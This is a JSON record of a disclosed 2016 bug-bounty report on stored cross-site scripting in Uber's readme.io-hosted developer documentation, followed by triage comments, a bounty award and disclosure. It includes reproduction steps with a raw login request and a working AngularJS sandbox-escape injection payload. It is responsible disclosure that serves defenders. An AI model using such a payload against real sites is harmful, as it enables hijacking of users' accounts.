{"id":131450,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzE0NTA=","url":"https://hackerone.com/reports/131450","title":"Stored XSS in developer.uber.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-16T22:25:38.643Z","submitted_at":"2016-04-16T22:25:38.643Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"albinowax","url":"/albinowax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-27T12:37:42.236Z","bug_reporter_agreed_on_going_public_at":"2016-05-28T12:37:41.349Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An attacker can make a series of requests to https://uber.readme.io/ that will result in permanent defacement/stored XSS of all the documentation pages on https://developer.uber.com/\n\nI'm not entirely sure if this is in scope, but it could definitely have a major impact on developer.uber.com so I figure you'd like to know either way. \n\n\nReproduction steps:\n\nLoad https://uber.readme.io/docs/deep-linking to get a connect.sid cookie\nAuthenticate the session by sending the following request to uber.readme.io:\n```\nPOST /users/session HTTP/1.1\nHost: uber.readme.io\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 84\nCookie: YOUR CONNECT.SID COOKIE HERE\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\n\n{\"email\":\"readme2@thursday.eml.cc\",\"password\":\"pjJnBODjkLFv!!11\",\"action\":\"session\"}\n```\n\nIf this worked, you'll see a response body something like \n```\n{\"id\":\"57129b7365324b0e002ad83b\",\"name\":\"James Kettle\",\"email\":\"readme2@thursday.eml.cc\",\"username\":\"\",\"provider\":\"local\",\"createdAt\":\"2016-04-16T20:07:15.871Z\",\"accessToken\":\"\",\"stripeId\":\"\",\"hasStripe\":false,\"email_verified\":false,\"hasGithub\":false,\"github\":{},\"is_admin\":false,\"is_god\":false}\n```\nGrab the new connect.sid cookie from this response.\n\nUsing the new connect.sid cookie value, load https://uber.readme.io/docs/deep-linking/edit - you should land on a 'Suggest edits' page (see screenshot)\n\nAdd the following payload into the document:\n```{{(_=\"\".sub).call.call({}[$=\"constructor\"].getOwnPropertyDescriptor(_.__proto__,$).value,0,\"alert(1)\")()}}```\nThen enter an arbitrary description then press 'suggest edits'. \n\nWhen an administrator next views the readme dashboard and clicks on the suggested edit, the injected JavaScript will execute (see screenshot). This JavaScript could automatically approve the suggestion.\n\nCongrats, you've now got your own JavaScript executing on https://uber.readme.io/docs/deep-linking - potentially hijacking the account of every developer who views it. \n\nThe obvious way to patch this is using the ng-nonbindable directive to nullify the stored-xss-via-suggested-edits problem. However, since readme.io appears to have a weak security posture, it may be worth considering shifting the readme.io-powered documentation to a separate domain from developer.uber.com, to ensure that XSS in readme.io can't hijack developer accounts.\n\nLet me know if a video would be helpful.","bounty_amount":"7500.0","formatted_bounty":"$7,500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-06-27T12:37:41.680Z","allow_singular_disclosure_after":-166928412.48913434,"singular_disclosure_allowed":true,"vote_count":208,"voters":["philip","dirk","irek","lukasreschke","arneswinnen","jensec","bendtheory","sp1d3rs","msultan","albinowax","and 198 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":912585,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @albinowax - sounds like an interesting issue, have you contacted `readme.io` about this issue yet?","automated_response":false,"created_at":"2016-04-18T18:01:47.735Z","updated_at":"2016-04-18T18:01:47.735Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":912608,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I haven't - based on how quickly https://hackerone.com/reports/125027 was patched, I assumed you have a good contact there. I'm happy to try and make contact directly though.","automated_response":false,"created_at":"2016-04-18T18:08:38.552Z","updated_at":"2016-04-18T18:08:38.552Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":912850,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mandatoryuber, Marc from readme.io replied that Uber contacted him about this issue yesterday and he patched it then. It looks fixed to me.","automated_response":false,"created_at":"2016-04-18T19:13:32.321Z","updated_at":"2016-04-18T19:25:44.432Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":913063,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Ah that's good - out of curiosity did Marc mention who reached out to him from our end? Just asked around the team and it doesn't appear anyone did that :). Just want to track down who originally validated this report. Closing as `Resolved` for now but that's a TODO before we do rewarding on this one.","automated_response":false,"created_at":"2016-04-18T20:31:45.693Z","updated_at":"2016-04-18T20:31:45.693Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"albinowax","url":"/albinowax"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":913116,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Never mind, this was solved :) we found the appropriate contact who let Readme know. Thanks.","automated_response":false,"created_at":"2016-04-18T20:47:42.049Z","updated_at":"2016-04-18T20:47:42.049Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":937576,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hey @albinowax cool exploit, thanks for the submission and please let us know if you find anything else.","automated_response":false,"created_at":"2016-05-02T22:54:23.706Z","updated_at":"2016-05-02T22:54:23.706Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Uber"}},"bounty_amount":"7500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"uber","collaborator":{"username":"albinowax","url":"/albinowax"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":988976,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks! I'll be sure to keep looking.","automated_response":false,"created_at":"2016-05-28T12:37:41.565Z","updated_at":"2016-05-28T12:37:41.565Z","first_to_agree":true,"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1012929,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Could we publicly disclose this?","automated_response":false,"created_at":"2016-06-14T13:28:29.069Z","updated_at":"2016-06-14T13:28:29.069Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1040579,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-06-27T12:37:42.310Z","updated_at":"2016-06-27T12:37:42.310Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Uber"}},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}